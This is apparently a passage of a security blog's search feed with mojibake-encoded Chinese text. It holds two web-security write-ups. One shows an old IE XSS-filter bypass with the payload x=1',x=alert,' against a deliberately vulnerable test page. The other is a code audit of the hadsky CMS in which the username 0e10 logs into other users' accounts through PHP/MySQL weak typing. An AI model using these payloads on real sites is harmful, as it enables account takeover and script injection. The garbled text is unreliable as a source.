<p>è¿˜æœ‰ä¸€äº›å‰ææ¡ä»¶ï¼Œä¾‹å¦‚Runtimeä¸åœ¨webç›®å½•å†…ï¼Œä¸€èˆ¬æƒ…å†µä¹Ÿæ˜¯åˆ©ç”¨ä¸äº†çš„ã€‚</p>
<p><strong>å¦‚ä½•å‡ºé”™ï¼Œæ³è¯·æŒ‡ç‚¹</strong></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web cache</tag>
      </tags>
  </entry>
  <entry>
    <title>é€šè¿‡å‡½æ•°é‡å®šä¹‰ç»•è¿‡xssè¿‡æ»¤å™¨(IE)</title>
    <url>/2017/08/17/%E9%80%9A%E8%BF%87%E5%87%BD%E6%95%B0%E9%87%8D%E5%AE%9A%E4%B9%89%E7%BB%95%E8%BF%87xss%E8%BF%87%E6%BB%A4%E5%99%A8(IE)/</url>
    <content><![CDATA[<!-- è¿™ä¸ªbypassçš„æ–¹æ³•åœ¨è¿‘æœŸçš„ç‰ˆæœ¬å·²ç»ä¸é€‚ç”¨ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥åœ¨å…¼å®¹æ¨¡å¼ä¸‹é€‚ç”¨ï¼Œä½ å¯ä»¥æƒ³ä¸€äº›åŠæ³•å¼ºåˆ¶IEè¿›å…¥å…¼å®¹æ¨¡å¼ï¼Œä¾‹å¦‚æ·»åŠ ä¸€æ åƒä¸‹é¢è¿™æ ·ï¼Œè¿™è¡Œä»£ç å°†ä½¿IEçš„JSå¼•æ“å›åˆ°è€æ—§æ¨¡å¼ï¼ˆIE7ï¼‰ã€‚ -->
<!-- more -->

<p>è¿™ä¸ªbypassçš„æ–¹æ³•åœ¨è¿‘æœŸçš„ç‰ˆæœ¬å·²ç»ä¸é€‚ç”¨ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥åœ¨å…¼å®¹æ¨¡å¼ä¸‹é€‚ç”¨ï¼Œä½ å¯ä»¥æƒ³ä¸€äº›åŠæ³•å¼ºåˆ¶IEè¿›å…¥å…¼å®¹æ¨¡å¼ï¼Œä¾‹å¦‚æ·»åŠ ä¸€æ åƒä¸‹é¢è¿™æ ·ï¼Œè¿™è¡Œä»£ç å°†ä½¿IEçš„JSå¼•æ“å›åˆ°è€æ—§æ¨¡å¼ï¼ˆIE7ï¼‰ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬éœ€è¦å»ºç«‹ä¸€ä¸ªå®éªŒé¡µé¢ï¼Œè®©ç”¨æˆ·å¯æ§å‚æ•°å‡ºç°åˆ°JSå‡½æ•°çš„å‚æ•°é‡Œé¢ã€‚</p>
<p>test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=EmulateIE7"</span> /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x = <span class="keyword">isset</span>($_GET[<span class="string">'x'</span>]) ? $_GET[<span class="string">'x'</span>] : <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">x(<span class="string">'&lt;?php echo $x?&gt;'</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨è€ç‰ˆæœ¬çš„IEæµè§ˆå™¨é‡Œé¢ï¼Œæ˜¯æœ‰å¯èƒ½åœ¨ä¸€ä¸ªå‡½æ•°çš„è°ƒç”¨å‚æ•°çš„åœ°æ–¹é‡å®šä¹‰è¿™ä¸ªå‡½æ•°çš„ã€‚è¿™å°†å¯¹ç»•è¿‡xssè¿‡æ»¤å™¨éå¸¸æœ‰ç”¨ï¼ˆå¦‚æœä½ çš„payloadèƒ½å‡ºç°åœ¨è¿™é‡Œï¼‰</p>
<p>é€šè¿‡GETä¼ å‚<code>somepage.php?x=1&#39;,x=alert,&#39;</code></p>
<p>æœ€åçš„ç»“æœåƒæ˜¯è¿™æ ·</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=EmulateIE7"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="actionscript">x(<span class="string">'1'</span>,x=alert,<span class="string">''</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªpayloadå°†é—­åˆä¸¤è¾¹çš„å¼•å·ï¼ŒåŒæ—¶<code>function x</code>é‡å®šä¹‰ä¸º<code>alert</code>å› ä¸ºalertåªæ¥å—ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å…¶ä»–çš„å¤šä½™å‚æ•°å°†è¢«å¿½ç•¥ã€‚</p>
<p><img src="xss1.png" alt="xss1.png"></p>
<h2 id="ä¸èƒŒç¿»è¯‘çš„é”…"><a href="#ä¸èƒŒç¿»è¯‘çš„é”…" class="headerlink" title="ä¸èƒŒç¿»è¯‘çš„é”…"></a>ä¸èƒŒç¿»è¯‘çš„é”…</h2><p><a href="http://www.thespanner.co.uk/2014/04/07/bypassing-the-xss-filter-using-function-reassignment/">http://www.thespanner.co.uk/2014/04/07/bypassing-the-xss-filter-using-function-reassignment/</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>hadskyéƒ¨åˆ†ç”¨æˆ·ä»»æ„ç™»å½•</title>
    <url>/2017/08/17/hadsky%E9%83%A8%E5%88%86%E7%94%A8%E6%88%B7%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[<!-- ç¬¬ä¸€æ¬¡ä»£ç å®¡è®¡ï¼Œä¸‡èƒ½ç”¨æˆ·å -->
<!-- more -->

<h2 id="æ¼æ´åˆ©ç”¨è¿‡ç¨‹"><a href="#æ¼æ´åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="æ¼æ´åˆ©ç”¨è¿‡ç¨‹"></a>æ¼æ´åˆ©ç”¨è¿‡ç¨‹</h2><p>åœ¨æ³¨å†Œé¡µé¢</p>
<p>æ³¨å†Œç”¨æˆ· å¯†ç ä¸ºpassword å…¶ä»–ä¿¡æ¯éšä¾¿å¡«</p>
<p>åœ¨ç™»é™†æ¡†ä»¥ç”¨æˆ·å0e10ï¼ˆä¸‡èƒ½ç”¨æˆ·åï¼‰ å¯†ç passwordç™»å½•</p>
<p><img src="%E6%8D%95%E8%8E%B72.PNG" alt="æ•è·2.PNG"></p>
<p><img src="%E6%8D%95%E8%8E%B7.PNG" alt="æ•è·.PNG"></p>
<p>æˆåŠŸç™»é™†</p>
<p><img src="%E6%8D%95%E8%8E%B74.PNG" alt="æ•è·4.PNG"></p>
<h2 id="æ¼æ´äº§ç”ŸåŸå› "><a href="#æ¼æ´äº§ç”ŸåŸå› " class="headerlink" title="æ¼æ´äº§ç”ŸåŸå› "></a>æ¼æ´äº§ç”ŸåŸå› </h2><p>è¯¥cmsæœ‰ä¸‰ç§ç™»é™†æ–¹å¼</p>
<p>ç”¨æˆ·UID é‚®ç®± ç”¨æˆ·å ä»£ç å¦‚ä¸‹</p>
<p>\upload\phpscript\checklogin.php ç¬¬6è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Cnum($_POST[<span class="string">'username'</span>])) &#123;</span><br><span class="line">	<span class="comment">//UIDç™»å½•</span></span><br><span class="line">	$__ud = $_G[<span class="string">'TABLE'</span>][<span class="string">'USER'</span>] -&gt; getData($_POST[<span class="string">'username'</span>]);</span><br><span class="line">	$username = $__ud[<span class="string">'username'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (strpos($_POST[<span class="string">'username'</span>], <span class="string">'@'</span>)) &#123;</span><br><span class="line">	<span class="comment">//é‚®ç®±ç™»å½•</span></span><br><span class="line">	$__ud = $_G[<span class="string">'TABLE'</span>][<span class="string">'USER'</span>] -&gt; getData(<span class="keyword">array</span>(<span class="string">'email'</span> =&gt; $_POST[<span class="string">'username'</span>]));</span><br><span class="line">	$username = $__ud[<span class="string">'username'</span>]</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">//ç”¨æˆ·åç™»å½•</span></span><br><span class="line">	preg_match(<span class="string">'/^[\x&#123;4e00&#125;-\x&#123;9fa5&#125;A-Za-z0-9_]+$/u'</span>, $_POST[<span class="string">'username'</span>]) ? $username = $_POST[<span class="string">'username'</span>] : $username = <span class="keyword">FALSE</span>;</span><br><span class="line">	<span class="keyword">if</span> (strlen($username) &gt; <span class="number">24</span> || strlen($username) &lt; <span class="number">3</span>) &#123;</span><br><span class="line">		$username = <span class="keyword">FALSE</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼šé¦–å…ˆè¿›å…¥Cnum()å‡½æ•°æ£€æŸ¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cnum</span><span class="params">($str, $return = <span class="number">0</span>, $int = true, $min = FALSE, $max = FALSE)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_numeric($str)) &#123;</span><br><span class="line">		<span class="comment">//0e10åœ¨è¿™é‡Œè¿›å…¥</span></span><br><span class="line">		<span class="keyword">if</span> ($int)</span><br><span class="line">			$str = (int)$str;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$str = $return;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($min !== <span class="keyword">FALSE</span>)</span><br><span class="line">		<span class="keyword">if</span> ($str &lt; $min)</span><br><span class="line">			$str = $return;</span><br><span class="line">	<span class="keyword">if</span> ($max !== <span class="keyword">FALSE</span>)</span><br><span class="line">		<span class="keyword">if</span> ($str &gt; $max)</span><br><span class="line">			$str = $return;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">	<span class="comment">//return 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯æ£€éªŒæ˜¯å¦ä½æ•°å­—,0e10çš„ç”¨æˆ·åç»è¿‡is_numberic()åˆ¤æ–­returuï¼Œæœ€åint()åï¼Œä»¥ return 0è¿”å›</p>
<p>é—®é¢˜å°±å‡ºåœ¨è¿™é‡Œ if (Cnum($_POST[â€˜usernameâ€™])) çœ‹åˆ°è¿”å›å€¼æ˜¯0ä¼šè®¤ä¸ºä»–ä¸æ˜¯æ•°å­—ï¼ˆå®é™…ä¸Šæ˜¯çš„å˜›åªæ˜¯ç§‘å­¦è®°æ•°æ³•è€Œå·²ï¼‰,äºæ˜¯ç»•è¿‡UIDç™»å½•æ–¹å¼ï¼Œ0e10æ˜¾ç„¶ä¹Ÿä¸ç¬¦åˆé‚®ç®±æ ¼å¼ï¼Œäºæ˜¯è¿›å…¥elseè¢«å½“æˆäº†ç”¨æˆ·åæ¥éªŒè¯ã€‚0e10ç¬¦åˆç”¨æˆ·åçš„æ ¼å¼ï¼Œäºæ˜¯æ¥ä¸‹æ¥è¿›å…¥ç”¨æˆ·å­˜åœ¨æ€§æ£€éªŒã€‚</p>
<p>\upload\phpscript\checklogin.php ç¬¬25è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!$username || !$password)</span><br><span class="line">	$chkr = <span class="string">'è¯·å¡«å…¥æ­£ç¡®çš„ç™»å½•ä¿¡æ¯'</span>;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå¼€å§‹ç›´æ¥è¾“å…¥0ï¼Œä¼šåœ¨è¿™é‡ŒæŠ¥é”™ï¼Œä½†æ˜¯0e10ä¸ä¼šç›®æµ‹<strong>PHPå¼±ç±»å‹</strong>çš„åŸå› ~</p>
<p>\upload\phpscript\checklogin.php ç¬¬34è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ£€éªŒæ•°æ®åº“ä¸­æ˜¯å¦æœ‰ç›¸åº”ç”¨æˆ·å</span></span><br><span class="line">$trylogindata = $_G[<span class="string">'TABLE'</span>][<span class="string">'USER'</span>] -&gt; getData(<span class="keyword">array</span>(<span class="string">'username'</span> =&gt; $username));</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›getData()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($field = NULL, $str = NULL)</span> </span>&#123;</span><br><span class="line">	<span class="comment">/*çœç•¥*/</span></span><br><span class="line">	<span class="keyword">if</span> (Cnum($field, <span class="keyword">FALSE</span>)) &#123;</span><br><span class="line">		$sql = <span class="string">"where `id`=&#123;$field&#125;"</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$sql = <span class="keyword">$this</span> -&gt; getSql($field, $str);</span><br><span class="line">	&#125;</span><br><span class="line">	$query = mysql_query(<span class="string">"select * from `&#123;$this-&gt;mysql_prefix&#125;&#123;$this-&gt;table&#125;` &#123;$sql&#125;"</span>);</span><br><span class="line">&#125;<span class="comment">/*çœç•¥*/</span></span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›getSql()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSql</span><span class="params">($field, $str = NULL)</span> </span>&#123;</span><br><span class="line">	<span class="comment">/*çœç•¥*/</span></span><br><span class="line">	&#125; <span class="keyword">elseif</span> (is_array($field) &amp;&amp; $str == <span class="keyword">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">foreach</span> ($field <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">			<span class="keyword">if</span> (Cstr($key, <span class="keyword">FALSE</span>, <span class="keyword">TRUE</span>, <span class="number">1</span>, <span class="number">255</span>))</span><br><span class="line">				$sql .= <span class="string">"`&#123;$key&#125;`="</span> . mysqlstr($value) . <span class="string">" and "</span>;<span class="comment">//æ— å¼•å·ä¿æŠ¤</span></span><br><span class="line">		&#125;</span><br><span class="line">&#125;<span class="comment">/*çœç•¥*/</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œmysqlstr($value)æ²¡æœ‰å¼•å·ä¿æŠ¤ç›´æ¥æ‹¼æ¥è¿›å»ï¼Œæœ€ç»ˆæ‰§è¡ŒSQLè¯­å¥å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($trylogindata) &#123;</span><br><span class="line">	<span class="comment">/*$trylogindataä¸ºçœŸåˆ™è¿›å…¥ç”¨æˆ·å¯†ç æ£€éªŒ*/</span></span><br></pre></td></tr></table></figure>

<p>ç”±äºMYSQLçš„å¼±ç±»å‹çš„å…³ç³»ï¼ˆ0=ä»»ä½•å­—ç¬¦ä¸²ï¼‰å› ä¸º<code>username</code>å­—æ®µæ˜¯æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åªè¦æ•°æ®åº“é‡Œæœ‰ä¸€æ¡æ•°æ®ï¼Œé‚£ä¹ˆ<code>getData(array(&#39;username&#39; =&gt; $username));</code>å°±ä¼šè¿”å›æ•°æ®ç»™<code>$trylogindata</code></p>
<p>\upload\phpscript\checklogin.php ç¬¬52è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($trylogindata) &#123;</span><br><span class="line">	<span class="comment">/*$trylogindataä¸ºçœŸåˆ™è¿›å…¥ç”¨æˆ·å¯†ç æ£€éªŒ*/</span></span><br></pre></td></tr></table></figure>

<p>ç”±äº<code>$trylogindata</code>å­˜åœ¨ï¼Œæ‰€ä»¥è¿›å…¥ifè¯­å¥</p>
<p>\upload\phpscript\checklogin.php ç¬¬52è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ£€éªŒå¯†ç æ˜¯å¦æ­£ç¡®</span></span><br><span class="line">$userdata = UserLogin(<span class="keyword">array</span>(<span class="string">'username'</span> =&gt; $username, <span class="string">'password'</span> =&gt; md5($password)));</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›UserLogin()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UserLogin</span><span class="params">($chkuserloginarray, $chkloginqx = true)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $_G;</span><br><span class="line">	$userdata = $_G[<span class="string">'TABLE'</span>][<span class="string">'USER'</span>] -&gt; getData($chkuserloginarray);</span><br><span class="line">	<span class="comment">/**çœç•¥**/</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ£€éªŒç”¨æˆ·åï¼Œå¯†ç ä¾ç„¶æ˜¯getData()å‡½æ•°</p>
<p>æœ€åæ‰§è¡ŒSQLè¯­å¥å°±æ˜¯</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`pk_user`</span> <span class="keyword">where</span> <span class="string">`username`</span>=<span class="number">0e10</span> <span class="keyword">and</span> <span class="keyword">password</span> = <span class="string">'xxxxxxxxx'</span></span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åªè¦æ•°æ®åº“ä¸­å­˜åœ¨å¯†ç ï¼Œå°±èƒ½ç™»é™†æ‹¥æœ‰ç›¸åº”å¯†ç çš„ç¬¬ä¸€ä¸ªç”¨æˆ·ï¼ˆä¸‡èƒ½ç”¨æˆ·åï¼‰ã€‚</p>
<p>ä¸€å¥è¯æ€»ç»“ï¼šæœªåŠ å¼•å·ä¿æŠ¤æ—¶ï¼ŒMYSQL+PHPå¼±ç±»å‹å¼•èµ·çš„ç™»é™†é€»è¾‘æ¼æ´</p>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>1ã€å‚å•†åŸè¯ï¼š<strong>ç³»ç»Ÿå¼€æºçš„ï¼Œä¹Ÿå¸Œæœ›å¤§å®¶å¤šå¤šæ”¯æŒï¼Œèƒ½æŠŠå‘ç°çš„é—®é¢˜å‘ç»™æˆ‘</strong></p>
<p>2ã€ä¸ªäººèƒ½åŠ›æœ‰é™ï¼Œå¦‚æœ‰é”™è¯¯è¿˜è¯·å¸ˆå‚…ä»¬å¤šå¤šæŒ‡æ•™</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
</search>
